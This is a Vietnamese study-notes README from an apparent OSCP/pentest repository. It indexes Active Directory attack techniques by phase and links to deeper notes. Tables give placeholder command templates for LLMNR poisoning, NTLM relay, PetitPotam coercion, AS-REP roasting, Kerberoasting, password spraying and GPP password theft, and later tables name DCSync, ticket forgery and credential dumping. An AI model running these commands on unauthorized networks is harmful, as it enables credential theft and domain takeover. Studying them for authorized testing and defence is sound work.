# AD-attacks — Bài tổng hợp tấn công Active Directory

Nơi gom riêng **phần tấn công** AD để xem/ôn nhanh, tách khỏi lý thuyết
([`../AD-concepts/`](../AD-concepts/README.md)). Mỗi kỹ thuật ghi ngắn gọn **khi
nào dùng + lệnh lõi**, và trỏ tới tài liệu chi tiết (mindmap / quy trình OSCP /
deep-dive) để xem sâu khi cần.

> Chỉ dùng trong lab / kỳ thi / pentest có ủy quyền.

## Tài liệu trong thư mục này
| File | Nội dung |
|------|----------|
| [kerberos-attacks.md](kerberos-attacks.md) | **Kerberos Attacks deep-dive** — AS-REP/Kerberoast, delegation (unconstrained/constrained/RBCD + krbrelayx), Golden/Silver ticket, Pass-the-Ticket, enum & spray (bám sát bài Hacer Dalkıran / HTB Academy) |

## Bản đồ tấn công đầy đủ (ở các thư mục khác)
- 🗺️ [`../mindmaps/AD-2025.03/`](../mindmaps/AD-2025.03/README.md) — giải thích từng box OCD AD Mindmap v2025.03 (nguồn chi tiết nhất về lệnh).
- 🎯 [`../OSCP-AD/`](../OSCP-AD/README.md) — tấn công theo quy trình luyện thi + lab + cheatsheet.

---

## Tổng hợp kỹ thuật theo nhóm (xem nhanh)

### 1. Không credential → tìm foothold
| Kỹ thuật | Lệnh lõi | Chi tiết |
|----------|----------|----------|
| Scan & xác định DC | `nxc smb <range>` ; `nmap -p88,389,445,53 <ip>` | [mindmaps/01](../mindmaps/AD-2025.03/01-no-credentials.md) |
| Null/guest/anonymous | `nxc smb <dc> -u '' -p '' --shares --users` | [mindmaps/01](../mindmaps/AD-2025.03/01-no-credentials.md) |
| User enum (Kerberos) | `kerbrute userenum -d <domain> --dc <dc> users.txt` | [kerberos-attacks §5](kerberos-attacks.md) |
| LLMNR/NBT-NS poisoning | `responder -I <iface>` | [mindmaps/01](../mindmaps/AD-2025.03/01-no-credentials.md) |
| NTLM relay | `ntlmrelayx.py -tf targets.txt -smb2support` | [mindmaps/14](../mindmaps/AD-2025.03/14-ntlm-relay.md) |
| Coerce (PetitPotam/printerbug) | `petitpotam.py -d <dom> <listener> <target>` | [mindmaps/01](../mindmaps/AD-2025.03/01-no-credentials.md) |

### 2. Có username → có credential
| Kỹ thuật | Lệnh lõi | Chi tiết |
|----------|----------|----------|
| AS-REP Roasting | `GetNPUsers.py <dom>/ -usersfile users.txt -no-pass -format hashcat` | [kerberos-attacks §1.1](kerberos-attacks.md) |
| Password spraying | `kerbrute passwordspray users.txt <pass> --dc <dc> -d <dom>` | [kerberos-attacks §5](kerberos-attacks.md) · [OSCP-AD/02](../OSCP-AD/02-co-username.md) |

### 3. Có credential → enum & tấn công đầu
| Kỹ thuật | Lệnh lõi | Chi tiết |
|----------|----------|----------|
| BloodHound | `bloodhound-ce-python -d <dom> -u <u> -p <p> -c all --zip` | [bloodhound/](../bloodhound/README.md) |
| Kerberoasting | `GetUserSPNs.py <dom>/<u>:<p> -request` | [kerberos-attacks §1.2](kerberos-attacks.md) |
| GPP cpassword | `Get-GPPPassword.py <dom>/<u>:<p>@<dc>` | [mindmaps/03](../mindmaps/AD-2025.03/03-valid-credentials-enum.md) |
| ADCS enum | `certipy find -u <u>@<dom> -p <p> -dc-ip <dc> -vulnerable` | [mindmaps/06](../mindmaps/AD-2025.03/06-adcs.md) |

### 4. Leo thang trong domain (ACL/ACE, nhóm, GPO)
| Kỹ thuật | Chi tiết |
|----------|----------|
| GenericAll/Write, WriteDacl/Owner, group, GPO, DNSAdmins, OU | [mindmaps/09](../mindmaps/AD-2025.03/09-acl-ace-abuse.md) · [OSCP-AD/04](../OSCP-AD/04-leo-thang-acl-delegation.md) |
| Shadow Credentials | [mindmaps/06](../mindmaps/AD-2025.03/06-adcs.md) · [mindmaps/09](../mindmaps/AD-2025.03/09-acl-ace-abuse.md) |

### 5. Kerberos (chuyên sâu)
| Kỹ thuật | Chi tiết |
|----------|----------|
| AS-REP / Kerberoast / PtT / OverPtH / Golden / Silver / Diamond | [kerberos-attacks.md](kerberos-attacks.md) |
| Delegation: Unconstrained / Constrained / RBCD / krbrelayx | [kerberos-attacks §2](kerberos-attacks.md) · [mindmaps/05](../mindmaps/AD-2025.03/05-kerberos-delegation.md) |

### 6. ADCS
| Kỹ thuật | Chi tiết |
|----------|----------|
| ESC1–ESC15, Certifried, relay ESC8/ESC11, Pass-the-Cert | [mindmaps/06](../mindmaps/AD-2025.03/06-adcs.md) |

### 7. Local privesc & dump credential
| Kỹ thuật | Chi tiết |
|----------|----------|
| SeImpersonate (Potato), winPEAS, service CVEs | [mindmaps/04](../mindmaps/AD-2025.03/04-low-access-privesc.md) · [OSCP-AD/06](../OSCP-AD/06-local-admin-dump-credential.md) |
| Dump LSASS/SAM/LSA/DPAPI/NTDS/gMSA/LAPS | [mindmaps/07](../mindmaps/AD-2025.03/07-credentials-harvesting.md) |

### 8. Lateral movement
| Kỹ thuật | Chi tiết |
|----------|----------|
| PtH / PtT / OverPtH, psexec/wmiexec/winrm/rdp, pivoting | [mindmaps/08](../mindmaps/AD-2025.03/08-lateral-movement.md) · [OSCP-AD/07](../OSCP-AD/07-lateral-movement-pivoting.md) |

### 9. Domain Admin & Persistence
| Kỹ thuật | Chi tiết |
|----------|----------|
| DCSync, NTDS.dit | [mindmaps/12](../mindmaps/AD-2025.03/12-domain-admin-persistence.md) · [OSCP-AD/08](../OSCP-AD/08-domain-admin-persistence.md) |
| Golden/Silver/Diamond/Sapphire, Skeleton, DSRM, Custom SSP, DCShadow, Golden cert | [mindmaps/12](../mindmaps/AD-2025.03/12-domain-admin-persistence.md) · [kerberos-attacks §3](kerberos-attacks.md) |

### 10. SCCM / MSSQL / Trusts
| Kỹ thuật | Chi tiết |
|----------|----------|
| SCCM (recon/elevate/takeover/creds/exec) | [mindmaps/10](../mindmaps/AD-2025.03/10-sccm.md) |
| MSSQL (xp_cmdshell, impersonate, linked servers, coerce) | [mindmaps/11](../mindmaps/AD-2025.03/11-mssql.md) |
| Trusts (child↔parent SID history, trust ticket, forest) | [mindmaps/13](../mindmaps/AD-2025.03/13-trusts.md) · [OSCP-AD/09](../OSCP-AD/09-trust.md) |

---

> Cần nền tảng lý thuyết cho bất kỳ kỹ thuật nào ở trên → xem
> [`../AD-concepts/`](../AD-concepts/README.md) và bảng tra cứu thuật ngữ
> [A→Z](../AD-concepts/17-thuat-ngu-tra-cuu.md).
